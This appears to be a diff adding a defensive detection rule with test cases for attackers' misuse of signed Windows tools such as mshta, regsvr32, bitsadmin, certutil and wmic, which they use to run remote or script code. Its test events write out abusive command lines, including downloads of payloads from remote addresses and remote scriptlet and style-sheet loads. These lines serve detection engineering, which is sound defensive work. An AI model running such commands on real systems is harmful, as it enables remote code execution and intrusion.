@@ -1,0 +1,149 @@
+id: DET-016
+title: Signed Windows tool used to run remote or script code (mshta, regsvr32, InstallUtil, cmstp, bitsadmin, certutil)
+status: experimental
+severity: high
+attack:
+  tactic: Stealth
+  technique: T1218
+  technique_name: System Binary Proxy Execution
+  also: [T1218.003, T1218.004, T1218.005, T1218.010, T1197, T1105]
+description: >
+  Windows ships many signed programs that can load and run code from a script, a library, or a web address.
+  Attackers use them because security tools trust them. The rule matches each tool only when the command line
+  shows the abusive form: mshta with a web address or an HTA file, regsvr32 loading scrobj.dll or a remote
+  script, InstallUtil run with the uninstall switch and no log, cmstp with the auto-elevate switch, bitsadmin
+  downloading from the web, certutil downloading or decoding, rundll32 running script, and wmic loading a remote
+  style sheet.
+type: match
+filter:
+  - action: process_create
+    process_name,original_name: mshta.exe
+    command_line|regex: '(?i)(https?://|\.hta\b|\.sct\b|javascript:|vbscript:)'
+  - action: process_create
+    process_name,original_name: regsvr32.exe
+    command_line|regex: '(?i)(scrobj\.dll|/i:\S*(https?://|\.sct))'
+  - action: process_create
+    process_name,original_name: installutil.exe
+    command_line|regex: '(?i)^(?=.*\s/u\b)(?=.*(/logfile=|/logtoconsole=false))'
+  - action: process_create
+    process_name,original_name: cmstp.exe
+    command_line|regex: '(?i)\s/au\b'
+  - action: process_create
+    process_name,original_name: bitsadmin.exe
+    command_line|regex: '(?i)(/(transfer|addfile)\b.*https?://|/setnotifycmdline\b)'
+  - action: process_create
+    process_name,original_name: certutil.exe
+    command_line|regex: '(?i)(-urlcache\b.*https?://|-decode\b)'
+  - action: process_create
+    process_name,original_name: rundll32.exe
+    command_line|regex: '(?i)(javascript:|vbscript:|mshtml[, ]+runhtmlapplication)'
+  - action: process_create
+    process_name,original_name: wmic.exe
+    command_line|regex: '(?i)/format:\s*[\x22\x27]?(https?://|\S+\.xsl)'
+entity_fields: [user, host, process_name]
+suppress_seconds: 300
+exclusions:
+  - match:
+      user: svc_updater
+      process_name: bitsadmin.exe
+      command_line|contains: 'http://repo.corp.example/'
+    reason: The software-update service uses bitsadmin to fetch packages from the internal repository (ticket IT-2288). Pinned to this account, this tool AND the internal address, so a download from anywhere else is still caught.
+false_positives: >
+  Update tools that use bitsadmin or certutil; some legacy login scripts that use mshta.
+triage:
+  - Read the whole command line. Where does it point (web address, file path)?
+  - What started the tool, and what did the tool start next?
+  - Fetch the file or address it names, in a safe environment, and look at it.
+response:
+  - Isolate the host if the payload is not recognised.
+  - Block the address at the proxy and search for other hosts that contacted it.
+  - Collect the process tree as evidence.
+tests:
+  - name: mshta opening an HTA file fires
+    expect: fire
+    events:
+      - {action: process_create, user: wardog, host: WS-005, process_name: mshta.exe, parent_process: powershell.exe, command_line: '"C:\windows\system32\mshta.exe" "C:\Users\wardog\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.hta"'}
+  - name: regsvr32 loading a remote script through scrobj.dll fires
+    expect: fire
+    events:
+      - {action: process_create, user: pgustavo, host: WS-005, process_name: regsvr32.exe, parent_process: powershell.exe, command_line: '"C:\windows\system32\regsvr32.exe" /s /n /u /i:http://10.10.10.5:8444/launcher.sct scrobj.dll'}
+  - name: cmstp with the auto-elevate switch fires
+    expect: fire
+    events:
+      - {action: process_create, user: wardog, host: WS-005, process_name: cmstp.exe, parent_process: powershell.exe, command_line: '"C:\windows\system32\cmstp.exe" /s C:\ProgramData\x.inf /au'}
+  - name: InstallUtil run with the uninstall switch and no log fires
+    expect: fire
+    events:
+      - {action: process_create, user: pgustavo, host: WS-005, process_name: InstallUtil.exe, parent_process: cmd.exe, command_line: 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\Public\payload.exe'}
+  - name: bitsadmin downloading from the web fires
+    expect: fire
+    events:
+      - {action: process_create, user: wardog, host: WS-005, process_name: bitsadmin.exe, parent_process: cmd.exe, command_line: 'bitsadmin /transfer job /download /priority high http://203.0.113.9/x.ps1 C:\Windows\Temp\x.ps1'}
+  - name: certutil decoding a file fires
+    expect: fire
+    events:
+      - {action: process_create, user: wardog, host: WS-005, process_name: certutil.exe, parent_process: cmd.exe, command_line: 'certutil -decode a.b64 a.exe'}
+  - name: mshta used with no web address or script file stays quiet
+    expect: no_fire
+    events:
+      - {action: process_create, user: j.smith, host: WS-002, process_name: mshta.exe, parent_process: explorer.exe, command_line: 'mshta.exe C:\Tools\about.txt'}
+  - name: regsvr32 registering an ordinary library stays quiet
+    expect: no_fire
+    events:
+      - {action: process_create, user: it.admin, host: WS-001, process_name: regsvr32.exe, parent_process: msiexec.exe, command_line: 'regsvr32.exe /s "C:\Program Files\Vendor\viewer.dll"'}
+  - name: bitsadmin only listing jobs stays quiet
+    expect: no_fire
+    events:
+      - {action: process_create, user: it.admin, host: WS-001, process_name: bitsadmin.exe, parent_process: cmd.exe, command_line: 'bitsadmin /list /allusers'}
+  - name: the update service using bitsadmin is excluded
+    expect: no_fire
+    events:
+      - {action: process_create, user: svc_updater, host: SRV-REPO-01, process_name: bitsadmin.exe, parent_process: svchost.exe, command_line: 'bitsadmin /transfer upd /download http://repo.corp.example/pkg.msi C:\Windows\Temp\pkg.msi'}
+  - name: the update service downloading from another address still fires
+    expect: fire
+    events:
+      - {action: process_create, user: svc_updater, host: SRV-REPO-01, process_name: bitsadmin.exe, parent_process: cmd.exe, command_line: 'bitsadmin /transfer upd /download http://203.0.113.9/pkg.msi C:\Windows\Temp\pkg.msi'}
+  - name: a renamed copy of mshta.exe is still caught through its original file name
+    expect: fire
+    events:
+      - {action: process_create, user: wardog, host: WS-005, process_name: ms.exe, original_name: MSHTA.EXE, parent_process: cmd.exe, command_line: 'C:\Users\Public\ms.exe http://203.0.113.70/a.hta'}
+  - name: "rundll32 running a javascript: URL fires"
+    expect: fire
+    events:
+      - {action: process_create, user: k.lee, host: WS-004, process_name: rundll32.exe, parent_process: winword.exe, command_line: 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write()'}
+  - name: wmic loading a remote style sheet fires
+    expect: fire
+    events:
+      - {action: process_create, user: k.lee, host: WS-004, process_name: wmic.exe, parent_process: cmd.exe, command_line: 'wmic.exe os get /format:"https://example.net/payload.xsl"'}
+  - name: the same tools with harmless arguments stay quiet
+    expect: no_fire
+    events:
+      - {action: process_create, user: k.lee, host: WS-004, process_name: installutil.exe, parent_process: msiexec.exe, command_line: 'installutil.exe C:\Apps\Service.exe'}
+      - {action: process_create, user: k.lee, host: WS-004, process_name: cmstp.exe, parent_process: explorer.exe, command_line: 'cmstp.exe /s corp-vpn.inf'}
+      - {action: process_create, user: k.lee, host: WS-004, process_name: certutil.exe, parent_process: cmd.exe, command_line: 'certutil.exe -hashfile C:\Reports\q3.pdf SHA256'}
+      - {action: process_create, user: k.lee, host: WS-004, process_name: rundll32.exe, parent_process: explorer.exe, command_line: 'rundll32.exe shell32.dll,Control_RunDLL desk.cpl'}
+      - {action: process_create, user: k.lee, host: WS-004, process_name: wmic.exe, parent_process: cmd.exe, command_line: 'wmic.exe os get caption'}
+  - name: the dangerous words typed into another program do not count
+    expect: no_fire
+    events:
+      - {action: process_create, user: k.lee, host: WS-004, process_name: notepad.exe, parent_process: explorer.exe, command_line: 'notepad.exe http://example.com/page.hta'}
+      - {action: process_create, user: k.lee, host: WS-004, process_name: notepad.exe, parent_process: explorer.exe, command_line: 'notepad.exe scrobj.dll-notes.txt'}
+      - {action: process_create, user: k.lee, host: WS-004, process_name: notepad.exe, parent_process: explorer.exe, command_line: 'notepad.exe /u /logfile= notes.txt'}
+      - {action: process_create, user: k.lee, host: WS-004, process_name: notepad.exe, parent_process: explorer.exe, command_line: 'notepad.exe /au notes.inf'}
+      - {action: process_create, user: k.lee, host: WS-004, process_name: notepad.exe, parent_process: explorer.exe, command_line: 'notepad.exe /transfer job http://example.com/file.txt'}
+      - {action: process_create, user: k.lee, host: WS-004, process_name: notepad.exe, parent_process: explorer.exe, command_line: 'notepad.exe -decode notes.b64 notes.txt'}
+      - {action: process_create, user: k.lee, host: WS-004, process_name: notepad.exe, parent_process: explorer.exe, command_line: 'notepad.exe javascript:notes'}
+      - {action: process_create, user: k.lee, host: WS-004, process_name: notepad.exe, parent_process: explorer.exe, command_line: 'notepad.exe /format:http://example.com/x.xsl'}
+  - name: installutil uninstalling a service (only /u) stays quiet
+    expect: no_fire
+    events:
+      - {action: process_create, user: k.lee, host: WS-004, process_name: installutil.exe, parent_process: msiexec.exe, command_line: 'installutil.exe /u C:\Apps\Service.exe'}
+  - name: installutil installing quietly with a log file (no /u) stays quiet
+    expect: no_fire
+    events:
+      - {action: process_create, user: k.lee, host: WS-004, process_name: installutil.exe, parent_process: msiexec.exe, command_line: 'installutil.exe /logfile= /LogToConsole=false C:\Apps\Service.exe'}
+  - name: the same event three times in a row is folded into one alert (repeats are throttled, not paged again)
+    expect: fire
+    alerts: 1
+    events:
+      - {action: process_create, user: wardog, host: WS-005, process_name: mshta.exe, parent_process: powershell.exe, command_line: '"C:\windows\system32\mshta.exe" "C:\Users\wardog\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.hta"', repeat: 3, every: 10s}
